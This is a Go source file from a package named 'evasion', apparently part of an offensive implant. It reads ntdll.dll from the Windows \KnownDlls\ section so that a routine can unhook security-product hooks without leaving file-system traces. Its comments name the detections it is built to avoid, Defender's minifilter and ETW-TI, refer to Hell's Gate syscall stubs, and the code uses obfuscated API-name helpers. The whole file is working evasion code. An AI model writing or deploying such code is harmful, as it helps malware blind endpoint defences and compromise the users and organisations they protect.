//go:build windows
// +build windows

package evasion

// readDllFromKnownDlls maps a DLL from the \KnownDlls\ object namespace
// section instead of opening it from disk.
//
// When unhookModule reads ntdll.dll via os.ReadFile an IRP_MJ_CREATE event
// appears in Defender's minifilter log and in ETW-TI FileCreate callbacks —
// an unmistakable IOC for "process opening ntdll for unhooking."
//
// \KnownDlls\ntdll.dll is a named Section object pre-mapped by SMSS at boot.
// Opening it via NtOpenSection produces no file-system IRP; it is a pure
// object-manager lookup, invisible to file-activity monitors.
//
// Callers receive a copy of the bytes and the mapped view is immediately
// unmapped.  unhookModule calls this first and falls back to os.ReadFile
// only if the section open fails (e.g. on Wine or stripped test environments).

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// winUnicodeString mirrors UNICODE_STRING (x64 layout: 2+2+4-pad+8 = 16 bytes).
type winUnicodeString struct {
	Length    uint16
	MaxLen    uint16
	_         [4]byte // padding to 8-byte-align Buffer
	Buffer    uintptr
}

// winObjectAttributes mirrors OBJECT_ATTRIBUTES (x64, 48 bytes).
type winObjectAttributes struct {
	Length                   uint32
	_                        [4]byte // padding
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	_                        [4]byte // padding
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// readDllFromKnownDlls opens \KnownDlls\<dllName> (e.g. "ntdll.dll") as a
// read-only section and returns a copy of its bytes.  Returns nil on failure.
func readDllFromKnownDlls(dllName string) []byte {
	path := sKnownDllsPath() + dllName
	pathW, err := windows.UTF16FromString(path)
	if err != nil {
		return nil
	}

	ustr := winUnicodeString{
		Length: uint16((len(pathW) - 1) * 2), // bytes, excluding null terminator
		MaxLen: uint16(len(pathW) * 2),
		Buffer: uintptr(unsafe.Pointer(&pathW[0])),
	}
	oa := winObjectAttributes{
		Length:     48,
		ObjectName: uintptr(unsafe.Pointer(&ustr)),
		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
	}

	// NtOpenSection is called before unhookNtdll completes, so we cannot rely
	// on Hell's Gate stubs (HGProc) being warm.  Using LazyProc is acceptable:
	// opening \KnownDlls is a low-signal operation and any EDR hook here will
	// simply allow it.
	ntOpen := windows.NewLazySystemDLL(sNtdll()).NewProc(sNtOpenSection())
	if ntOpen.Find() != nil {
		return nil
	}

	const sectionMapRead = 0x0004
	var hSection uintptr
	r, _, _ := ntOpen.Call(
		uintptr(unsafe.Pointer(&hSection)),
		sectionMapRead,
		uintptr(unsafe.Pointer(&oa)),
	)
	if r != 0 || hSection == 0 {
		return nil
	}
	defer windows.CloseHandle(windows.Handle(hSection))

	var base uintptr
	var size uintptr
	if !NtMapViewOfSection(hSection, ntCurrentProcess, &base, &size, windows.PAGE_READONLY) {
		return nil
	}
	defer NtUnmapViewOfSection(ntCurrentProcess, base)

	if base == 0 || size == 0 || size > 32*1024*1024 {
		return nil
	}
	out := make([]byte, size)
	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(base)), size))
	return out
}
